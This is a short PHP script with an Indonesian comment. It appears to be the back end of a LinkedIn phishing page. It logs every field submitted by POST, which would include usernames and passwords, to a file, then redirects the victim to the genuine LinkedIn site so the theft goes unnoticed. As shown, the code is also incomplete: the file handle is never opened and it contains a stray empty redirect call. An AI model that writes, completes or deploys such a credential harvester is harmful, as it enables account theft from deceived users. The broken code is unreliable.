<?php
header
('location:');
if ($handle) {
     foreach($_POST as $variable=>$value) {
       fwrite($handle,$variable);
       fwrite($handle,",");
       fwrite($handle,$value);
       fwrite($handle,"\r\n");
     }
     fwrite($handle,"\r\n");
     fclose($handle);
   } else {
     // Tindakan jika file tidak berhasil dibuka
   };
header("location:https://www.linkedin.com/");
exit;
?>
